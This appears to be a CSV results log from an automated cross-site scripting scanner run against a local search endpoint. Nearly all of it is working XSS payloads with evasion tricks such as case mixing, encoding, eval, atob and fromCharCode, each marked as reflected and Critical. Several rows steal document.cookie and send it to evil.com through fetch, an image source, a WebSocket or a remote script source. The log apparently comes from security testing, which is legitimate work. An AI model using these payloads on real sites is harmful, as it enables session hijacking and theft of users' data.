+2026-01-10 16:23:32.070,2026-01-10 16:23:32.079,0.009,http://localhost:3000/search,GET,q,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.079,2026-01-10 16:23:32.082,0.003,http://localhost:3000/search,GET,q,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.082,2026-01-10 16:23:32.085,0.002,http://localhost:3000/search,GET,q,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.085,2026-01-10 16:23:32.092,0.007,http://localhost:3000/search,GET,q,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.092,2026-01-10 16:23:32.095,0.003,http://localhost:3000/search,GET,q,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.095,2026-01-10 16:23:32.098,0.003,http://localhost:3000/search,GET,q,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.098,2026-01-10 16:23:32.101,0.003,http://localhost:3000/search,GET,q,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.101,2026-01-10 16:23:32.103,0.002,http://localhost:3000/search,GET,q,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.103,2026-01-10 16:23:32.111,0.009,http://localhost:3000/search,GET,q,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.111,2026-01-10 16:23:32.114,0.003,http://localhost:3000/search,GET,q,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.114,2026-01-10 16:23:32.117,0.002,http://localhost:3000/search,GET,q,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.117,2026-01-10 16:23:32.123,0.007,http://localhost:3000/search,GET,q,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.124,2026-01-10 16:23:32.126,0.003,http://localhost:3000/search,GET,q,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.126,2026-01-10 16:23:32.129,0.003,http://localhost:3000/search,GET,q,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.129,2026-01-10 16:23:32.132,0.002,http://localhost:3000/search,GET,q,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.132,2026-01-10 16:23:32.134,0.002,http://localhost:3000/search,GET,q,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.134,2026-01-10 16:23:32.140,0.006,http://localhost:3000/search,GET,q,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.140,2026-01-10 16:23:32.143,0.003,http://localhost:3000/search,GET,q,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.143,2026-01-10 16:23:32.146,0.003,http://localhost:3000/search,GET,q,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.146,2026-01-10 16:23:32.149,0.002,http://localhost:3000/search,GET,q,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.149,2026-01-10 16:23:32.155,0.007,http://localhost:3000/search,GET,q,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.155,2026-01-10 16:23:32.158,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.158,2026-01-10 16:23:32.162,0.004,http://localhost:3000/search,GET,q,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.162,2026-01-10 16:23:32.164,0.002,http://localhost:3000/search,GET,q,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.164,2026-01-10 16:23:32.171,0.007,http://localhost:3000/search,GET,q,<script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.171,2026-01-10 16:23:32.174,0.003,http://localhost:3000/search,GET,q,alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.174,2026-01-10 16:23:32.177,0.003,http://localhost:3000/search,GET,q,</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.177,2026-01-10 16:23:32.179,0.002,http://localhost:3000/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.179,2026-01-10 16:23:32.182,0.002,http://localhost:3000/search,GET,q,<svg,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.182,2026-01-10 16:23:32.188,0.006,http://localhost:3000/search,GET,q,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.188,2026-01-10 16:23:32.191,0.003,http://localhost:3000/search,GET,q,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.191,2026-01-10 16:23:32.193,0.003,http://localhost:3000/search,GET,q,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.193,2026-01-10 16:23:32.196,0.003,http://localhost:3000/search,GET,q,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.196,2026-01-10 16:23:32.199,0.003,http://localhost:3000/search,GET,q,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.199,2026-01-10 16:23:32.207,0.008,http://localhost:3000/search,GET,q,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.207,2026-01-10 16:23:32.211,0.004,http://localhost:3000/search,GET,q,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.211,2026-01-10 16:23:32.214,0.003,http://localhost:3000/search,GET,q,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.214,2026-01-10 16:23:32.220,0.007,http://localhost:3000/search,GET,q,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.220,2026-01-10 16:23:32.226,0.005,http://localhost:3000/search,GET,q,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.226,2026-01-10 16:23:32.229,0.003,http://localhost:3000/search,GET,q,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.229,2026-01-10 16:23:32.237,0.008,http://localhost:3000/search,GET,q,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.237,2026-01-10 16:23:32.240,0.003,http://localhost:3000/search,GET,q,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.240,2026-01-10 16:23:32.243,0.003,http://localhost:3000/search,GET,q,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.243,2026-01-10 16:23:32.245,0.003,http://localhost:3000/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.245,2026-01-10 16:23:32.248,0.002,http://localhost:3000/search,GET,q,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.248,2026-01-10 16:23:32.254,0.006,http://localhost:3000/search,GET,q,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.254,2026-01-10 16:23:32.256,0.003,http://localhost:3000/search,GET,q,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.256,2026-01-10 16:23:32.259,0.003,http://localhost:3000/search,GET,q,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.259,2026-01-10 16:23:32.261,0.003,http://localhost:3000/search,GET,q,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.261,2026-01-10 16:23:32.264,0.002,http://localhost:3000/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.264,2026-01-10 16:23:32.270,0.006,http://localhost:3000/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.270,2026-01-10 16:23:32.273,0.003,http://localhost:3000/search,GET,q,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.273,2026-01-10 16:23:32.275,0.002,http://localhost:3000/search,GET,q,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.275,2026-01-10 16:23:32.278,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.278,2026-01-10 16:23:32.280,0.002,http://localhost:3000/search,GET,q,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.280,2026-01-10 16:23:32.282,0.002,http://localhost:3000/search,GET,q,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.282,2026-01-10 16:23:32.288,0.006,http://localhost:3000/search,GET,q,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.288,2026-01-10 16:23:32.291,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.291,2026-01-10 16:23:32.294,0.003,http://localhost:3000/search,GET,q,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.294,2026-01-10 16:23:32.296,0.002,http://localhost:3000/search,GET,q,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.296,2026-01-10 16:23:32.298,0.002,http://localhost:3000/search,GET,q,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.298,2026-01-10 16:23:32.304,0.006,http://localhost:3000/search,GET,q,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.304,2026-01-10 16:23:32.307,0.003,http://localhost:3000/search,GET,q,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.307,2026-01-10 16:23:32.310,0.003,http://localhost:3000/search,GET,q,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.310,2026-01-10 16:23:32.313,0.002,http://localhost:3000/search,GET,q,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.313,2026-01-10 16:23:32.315,0.002,http://localhost:3000/search,GET,q,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.315,2026-01-10 16:23:32.321,0.006,http://localhost:3000/search,GET,q,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.321,2026-01-10 16:23:32.323,0.003,http://localhost:3000/search,GET,q,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.324,2026-01-10 16:23:32.326,0.003,http://localhost:3000/search,GET,q,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.326,2026-01-10 16:23:32.329,0.002,http://localhost:3000/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.329,2026-01-10 16:23:32.331,0.002,http://localhost:3000/search,GET,q,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.331,2026-01-10 16:23:32.339,0.008,http://localhost:3000/search,GET,q,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.339,2026-01-10 16:23:32.341,0.002,http://localhost:3000/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.341,2026-01-10 16:23:32.344,0.003,http://localhost:3000/search,GET,q,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.344,2026-01-10 16:23:32.346,0.002,http://localhost:3000/search,GET,q,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.346,2026-01-10 16:23:32.349,0.002,http://localhost:3000/search,GET,q,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.349,2026-01-10 16:23:32.355,0.006,http://localhost:3000/search,GET,q,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.355,2026-01-10 16:23:32.357,0.003,http://localhost:3000/search,GET,q,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.357,2026-01-10 16:23:32.360,0.003,http://localhost:3000/search,GET,q,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.360,2026-01-10 16:23:32.363,0.002,http://localhost:3000/search,GET,q,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.363,2026-01-10 16:23:32.365,0.002,http://localhost:3000/search,GET,q,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.365,2026-01-10 16:23:32.371,0.006,http://localhost:3000/search,GET,q,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.371,2026-01-10 16:23:32.374,0.003,http://localhost:3000/search,GET,q,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.374,2026-01-10 16:23:32.377,0.003,http://localhost:3000/search,GET,q,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.377,2026-01-10 16:23:32.379,0.002,http://localhost:3000/search,GET,q,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.379,2026-01-10 16:23:32.381,0.002,http://localhost:3000/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.381,2026-01-10 16:23:32.388,0.006,http://localhost:3000/search,GET,q,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.388,2026-01-10 16:23:32.391,0.003,http://localhost:3000/search,GET,q,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.391,2026-01-10 16:23:32.395,0.003,http://localhost:3000/search,GET,q,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.395,2026-01-10 16:23:32.398,0.003,http://localhost:3000/search,GET,q,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.398,2026-01-10 16:23:32.406,0.009,http://localhost:3000/search,GET,q,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.406,2026-01-10 16:23:32.411,0.005,http://localhost:3000/search,GET,q,<div contenteditable onblur=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.411,2026-01-10 16:23:32.415,0.004,http://localhost:3000/search,GET,q,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.415,2026-01-10 16:23:32.418,0.003,http://localhost:3000/search,GET,q,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.419,2026-01-10 16:23:32.431,0.013,http://localhost:3000/search,GET,q,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.431,2026-01-10 16:23:32.437,0.006,http://localhost:3000/search,GET,q,<svg><animatemotion onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.437,2026-01-10 16:23:32.442,0.005,http://localhost:3000/search,GET,q,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.442,2026-01-10 16:23:32.449,0.007,http://localhost:3000/search,GET,q,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.449,2026-01-10 16:23:32.464,0.014,http://localhost:3000/search,GET,q,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.464,2026-01-10 16:23:32.471,0.008,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.471,2026-01-10 16:23:32.486,0.015,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.486,2026-01-10 16:23:32.494,0.007,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.494,2026-01-10 16:23:32.500,0.006,http://localhost:3000/search,GET,q,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.500,2026-01-10 16:23:32.511,0.011,http://localhost:3000/search,GET,q,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.511,2026-01-10 16:23:32.515,0.004,http://localhost:3000/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.515,2026-01-10 16:23:32.518,0.004,http://localhost:3000/search,GET,q,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.518,2026-01-10 16:23:32.522,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.522,2026-01-10 16:23:32.538,0.016,http://localhost:3000/search,GET,q,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.538,2026-01-10 16:23:32.543,0.005,http://localhost:3000/search,GET,q,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.543,2026-01-10 16:23:32.554,0.011,http://localhost:3000/search,GET,q,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.554,2026-01-10 16:23:32.557,0.003,http://localhost:3000/search,GET,q,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.557,2026-01-10 16:23:32.560,0.002,http://localhost:3000/search,GET,q,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.560,2026-01-10 16:23:32.564,0.004,http://localhost:3000/search,GET,q,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.564,2026-01-10 16:23:32.573,0.009,http://localhost:3000/search,GET,q,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.573,2026-01-10 16:23:32.577,0.004,http://localhost:3000/search,GET,q,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.577,2026-01-10 16:23:32.581,0.004,http://localhost:3000/search,GET,q,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.581,2026-01-10 16:23:32.584,0.003,http://localhost:3000/search,GET,q,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.584,2026-01-10 16:23:32.591,0.007,http://localhost:3000/search,GET,q,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.591,2026-01-10 16:23:32.595,0.004,http://localhost:3000/search,GET,q,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.595,2026-01-10 16:23:32.599,0.004,http://localhost:3000/search,GET,q,﻿<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.599,2026-01-10 16:23:32.602,0.003,http://localhost:3000/search,GET,q,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.602,2026-01-10 16:23:32.610,0.007,http://localhost:3000/search,GET,q,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.610,2026-01-10 16:23:32.613,0.003,http://localhost:3000/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.613,2026-01-10 16:23:32.617,0.004,http://localhost:3000/search,GET,q,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.617,2026-01-10 16:23:32.621,0.004,http://localhost:3000/search,GET,q,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.621,2026-01-10 16:23:32.628,0.007,http://localhost:3000/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.628,2026-01-10 16:23:32.632,0.004,http://localhost:3000/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.632,2026-01-10 16:23:32.635,0.003,http://localhost:3000/search,GET,q,<button autofocus onfocus=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.635,2026-01-10 16:23:32.638,0.003,http://localhost:3000/search,GET,q,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.638,2026-01-10 16:23:32.641,0.003,http://localhost:3000/search,GET,q,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.641,2026-01-10 16:23:32.650,0.009,http://localhost:3000/search,GET,q,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.650,2026-01-10 16:23:32.653,0.003,http://localhost:3000/search,GET,q,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.653,2026-01-10 16:23:32.656,0.003,http://localhost:3000/search,GET,q,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.656,2026-01-10 16:23:32.664,0.008,http://localhost:3000/search,GET,q,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.664,2026-01-10 16:23:32.669,0.005,http://localhost:3000/search,GET,q,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.669,2026-01-10 16:23:32.672,0.003,http://localhost:3000/search,GET,q,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.672,2026-01-10 16:23:32.680,0.008,http://localhost:3000/search,GET,q,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.680,2026-01-10 16:23:32.685,0.005,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.685,2026-01-10 16:23:32.688,0.003,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.688,2026-01-10 16:23:32.691,0.003,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.691,2026-01-10 16:23:32.701,0.010,http://localhost:3000/search,GET,q,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.701,2026-01-10 16:23:32.704,0.003,http://localhost:3000/search,GET,q,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.704,2026-01-10 16:23:32.707,0.002,http://localhost:3000/search,GET,q,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.707,2026-01-10 16:23:32.714,0.007,http://localhost:3000/search,GET,q,<div contenteditable oninput=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.714,2026-01-10 16:23:32.719,0.005,http://localhost:3000/search,GET,q,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.719,2026-01-10 16:23:32.722,0.003,http://localhost:3000/search,GET,q,<select><option oninput=alert(1)>X</option></select>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.722,2026-01-10 16:23:32.725,0.003,http://localhost:3000/search,GET,q,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.725,2026-01-10 16:23:32.733,0.008,http://localhost:3000/search,GET,q,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.733,2026-01-10 16:23:32.736,0.003,http://localhost:3000/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.736,2026-01-10 16:23:32.739,0.003,http://localhost:3000/search,GET,q,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.739,2026-01-10 16:23:32.741,0.002,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.741,2026-01-10 16:23:32.749,0.007,http://localhost:3000/search,GET,q,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.749,2026-01-10 16:23:32.752,0.003,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.752,2026-01-10 16:23:32.755,0.003,http://localhost:3000/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.755,2026-01-10 16:23:32.758,0.003,http://localhost:3000/search,GET,q,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.758,2026-01-10 16:23:32.767,0.009,http://localhost:3000/search,GET,q,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.767,2026-01-10 16:23:32.770,0.003,http://localhost:3000/search,GET,q,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.770,2026-01-10 16:23:32.772,0.002,http://localhost:3000/search,GET,q,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.772,2026-01-10 16:23:32.778,0.006,http://localhost:3000/search,GET,q,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.778,2026-01-10 16:23:32.783,0.004,http://localhost:3000/search,GET,q,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.783,2026-01-10 16:23:32.785,0.003,http://localhost:3000/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
